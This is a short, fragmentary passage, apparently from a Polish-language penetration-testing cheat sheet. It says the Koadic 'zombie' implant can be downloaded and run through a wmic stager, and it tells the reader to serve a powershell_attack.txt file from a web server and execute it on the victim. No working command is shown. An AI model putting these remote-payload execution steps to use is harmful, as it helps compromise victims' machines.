...
**Możesz bardzo łatwo pobrać i wykonać zombi Koadic za pomocą stagera wmic**
...
```
Uruchom serwer WWW, który serwuje plik _powershell\_attack.txt_ i wykonaj go na ofierze:
```
